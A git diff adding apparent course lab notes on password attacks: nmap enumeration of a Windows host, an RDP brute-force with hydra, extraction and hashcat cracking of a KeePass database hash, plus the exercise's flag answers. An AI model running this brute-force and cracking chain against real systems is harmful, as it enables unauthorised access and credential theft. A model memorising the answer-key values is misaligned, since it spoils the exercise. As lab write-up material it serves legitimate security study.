@@ -140,3 +140,114 @@ hydra -I -l admin -P /usr/share/wordlists/rockyou.txt "http-get://192.168.227.20
 ```
 
 > Answer:  789456
+
+
+
+# 15.2.4 Password Manager
+
+2. Enumerate VM #2 and get access to the system as user _nadine_. Obtain the password stored as title "flag" in the password manager.
+```bash
+# Enumerate
+sudo nmap -Pn -vv -n -p- 192.168.212.227 --max-scan-delay=0 
+	PORT      STATE SERVICE       REASON
+	135/tcp   open  msrpc         syn-ack ttl 125
+	139/tcp   open  netbios-ssn   syn-ack ttl 125
+	445/tcp   open  microsoft-ds  syn-ack ttl 125
+	3389/tcp  open  ms-wbt-server syn-ack ttl 125
+	5040/tcp  open  unknown       syn-ack ttl 125
+	49664/tcp open  unknown       syn-ack ttl 125
+	49665/tcp open  unknown       syn-ack ttl 125
+	49666/tcp open  unknown       syn-ack ttl 125
+	49667/tcp open  unknown       syn-ack ttl 125
+	49668/tcp open  unknown       syn-ack ttl 125
+	49669/tcp open  unknown       syn-ack ttl 125
+	49670/tcp open  unknown       syn-ack ttl 125
+	49671/tcp open  unknown       syn-ack ttl 125
+
+sudo nmap -sCV -p 135,139,445,3389,5040,49664,49665,49666,49667,49668,49669,49670,49671 192.168.212.227
+	PORT      STATE SERVICE            VERSION
+	135/tcp   open  msrpc              Microsoft Windows RPC
+	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+	445/tcp   open  microsoft-ds?
+	3389/tcp  open  ssl/ms-wbt-server?
+	| rdp-ntlm-info: 
+	|   Target_Name: MARKETINGWK02
+	|   NetBIOS_Domain_Name: MARKETINGWK02
+	|   NetBIOS_Computer_Name: MARKETINGWK02
+	|   DNS_Domain_Name: marketingwk02
+	|   DNS_Computer_Name: marketingwk02
+	|   Product_Version: 10.0.22000
+	|_  System_Time: 2024-04-01T22:19:08+00:00
+	|_ssl-date: 2024-04-01T22:19:23+00:00; +1s from scanner time.
+	| ssl-cert: Subject: commonName=marketingwk02
+	| Not valid before: 2024-03-31T22:09:20
+	|_Not valid after:  2024-09-30T22:09:20
+	5040/tcp  open  unknown
+	49664/tcp open  msrpc              Microsoft Windows RPC
+	49665/tcp open  msrpc              Microsoft Windows RPC
+	49666/tcp open  msrpc              Microsoft Windows RPC
+	49667/tcp open  msrpc              Microsoft Windows RPC
+	49668/tcp open  msrpc              Microsoft Windows RPC
+	49669/tcp open  msrpc              Microsoft Windows RPC
+	49670/tcp open  msrpc              Microsoft Windows RPC
+	49671/tcp open  msrpc              Microsoft Windows RPC
+	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+	
+	Host script results:
+	| smb2-time: 
+	|   date: 2024-04-01T22:19:13
+	|_  start_date: N/A
+	| smb2-security-mode: 
+	|   3:1:1: 
+	|_    Message signing enabled but not required
+```
+
+- Attack RDP
+```bash
+hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.212.227
+	[3389][rdp] host: 192.168.212.227   login: nadine   password: 123abc
+
+# Login
+xfreerdp /cert-ignore /compression /auto-reconnect /u:nadine /p:123abc /v:192.168.212.227 /drive:test,/home/kali/exercises/ 
+```
+
+- Check for KeePass (it's there)
+- Find DB file
+```powershell
+C:\>dir /s *.kdbx
+	 Volume in drive C has no label.
+	 Volume Serial Number is 1682-A2A3
+	
+	 Directory of C:\Users\nadine\Documents
+	
+	06/09/2022  10:39 AM             1,966 Database.kdbx
+	               1 File(s)          1,966 bytes
+	
+	     Total Files Listed:
+	               1 File(s)          1,966 bytes
+	               0 Dir(s)   1,184,964,608 bytes free
+```
+
+- Transfer *Database.kdbx* file to Kali & crack
+```bash
+keepass2john Database.kdbx > keepass.hash
+
+# Remove prepend of 'Database:'
+vim keepass.hash
+
+cat keepass.hash
+	$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
+
+# Crack
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+	$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56:pinkpanther1234
+```
+
+- Use `pinkpanther1234` for KeePass Master Password & get flag
+
+> Answer:  `eSGJIzUp5nrr834QZBWK`
+
+
+
+# 15.2.5 SSH Private Key Passphrase
+
